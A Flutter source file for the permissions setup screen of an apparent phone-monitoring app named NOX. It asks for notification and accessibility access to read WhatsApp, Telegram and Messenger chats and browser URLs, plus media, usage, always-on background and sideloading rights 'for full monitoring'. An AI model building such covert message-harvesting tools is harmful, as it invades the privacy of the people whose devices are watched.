import 'package:flutter/material.dart';
import '../config/theme.dart';
import '../services/native_bridge.dart';

/// First-launch setup screen that walks the user through granting all
/// required permissions. Each row is tappable — opens the relevant system
/// settings page.
class PermissionsSetupScreen extends StatefulWidget {
  final VoidCallback onDone;
  const PermissionsSetupScreen({super.key, required this.onDone});

  @override
  State<PermissionsSetupScreen> createState() => _PermissionsSetupScreenState();
}

class _PermissionsSetupScreenState extends State<PermissionsSetupScreen>
    with WidgetsBindingObserver {
  PermissionsSnapshot _snap = const PermissionsSnapshot();
  bool _loading = true;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _refresh();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) _refresh();
  }

  Future<void> _refresh() async {
    setState(() => _loading = true);
    try {
      _snap = await NativeBridge.getPermissionsSnapshot();
    } catch (_) {}
    if (mounted) setState(() => _loading = false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: NoxTheme.background,
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.all(24),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const SizedBox(height: 24),
              const Text('NOX', style: TextStyle(color: Colors.white, fontSize: 36, fontWeight: FontWeight.bold, letterSpacing: 8), textAlign: TextAlign.center),
              const SizedBox(height: 8),
              const Text('Setup Required', style: TextStyle(color: Color(0xFF888888), fontSize: 14), textAlign: TextAlign.center),
              const SizedBox(height: 32),
              const Text('Enable all permissions below for full monitoring:', style: TextStyle(color: Color(0xFFCCCCCC), fontSize: 14, height: 1.5)),
              const SizedBox(height: 24),

              Expanded(
                child: _loading
                    ? const Center(child: CircularProgressIndicator())
                    : ListView(
                        children: [
                          _PermRow(
                            icon: Icons.notifications_active,
                            label: 'Notification Access',
                            sub: 'WhatsApp, Telegram, Messenger messages',
                            granted: _snap.notificationListener,
                            onTap: () => NativeBridge.openNotificationListenerSettings(),
                          ),
                          _PermRow(
                            icon: Icons.accessibility_new,
                            label: 'Accessibility Service',
                            sub: 'Chat content & browser URLs',
                            granted: _snap.accessibility,
                            onTap: () => NativeBridge.openAccessibilitySettings(),
                          ),
                          _PermRow(
                            icon: Icons.bar_chart,
                            label: 'Usage Access',
                            sub: 'App usage & screen time',
                            granted: _snap.usageAccess,
                            onTap: () => NativeBridge.openUsageAccessSettings(),
                          ),
                          _PermRow(
                            icon: Icons.battery_saver,
                            label: 'Battery Unrestricted',
                            sub: '24/7 background connection',
                            granted: _snap.batteryUnrestricted,
                            onTap: () => NativeBridge.requestIgnoreBatteryOptimizations(),
                          ),
                          _PermRow(
                            icon: Icons.notifications,
                            label: 'Post Notifications',
                            sub: 'Show monitoring-active indicator',
                            granted: _snap.postNotifications,
                            onTap: () => NativeBridge.openAppNotificationSettings(),
                          ),
                          _PermRow(
                            icon: Icons.photo_library,
                            label: 'Media / Gallery Access',
                            sub: 'Photos, screenshots, WhatsApp media',
                            granted: _snap.mediaAccess,
                            onTap: () => NativeBridge.openAppNotificationSettings(),
                          ),
                          _PermRow(
                            icon: Icons.system_update_alt,
                            label: 'Install Unknown Apps',
                            sub: 'Required for in-app updates',
                            granted: _snap.installPackages,
                            onTap: () => NativeBridge.openManageInstallSources(),
                          ),
                        ],
                      ),
              ),

              const SizedBox(height: 16),
              Row(
                children: [
                  Expanded(
                    child: TextButton(
                      onPressed: _refresh,
                      child: const Text('Refresh', style: TextStyle(color: Color(0xFF888888))),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    flex: 2,
                    child: ElevatedButton(
                      onPressed: widget.onDone,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _snap.allEssentialGranted ? const Color(0xFF00E5FF) : const Color(0xFF333333),
                        foregroundColor: _snap.allEssentialGranted ? Colors.black : Colors.white,
                        padding: const EdgeInsets.symmetric(vertical: 16),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                      ),
                      child: Text(_snap.allEssentialGranted ? 'Continue' : 'Skip for now'),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 16),
            ],
          ),
        ),
      ),
    );
  }
}

class _PermRow extends StatelessWidget {
  final IconData icon;
  final String label;
  final String sub;
  final bool granted;
  final VoidCallback onTap;

  const _PermRow({
    required this.icon, required this.label, required this.sub,
    required this.granted, required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    return InkWell(
      onTap: granted ? null : onTap,
      borderRadius: BorderRadius.circular(12),
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: NoxTheme.surface,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: granted ? const Color(0xFF00E5FF).withValues(alpha: 0.4) : const Color(0xFF333333)),
        ),
        child: Row(
          children: [
            Icon(icon, color: granted ? const Color(0xFF00E5FF) : const Color(0xFF888888), size: 24),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(label, style: const TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w600)),
                  const SizedBox(height: 2),
                  Text(sub, style: const TextStyle(color: Color(0xFF888888), fontSize: 12)),
                ],
              ),
            ),
            Icon(granted ? Icons.check_circle : Icons.arrow_forward_ios,
              color: granted ? const Color(0xFF00E5FF) : const Color(0xFF555555), size: 20),
          ],
        ),
      ),
    );
  }
}
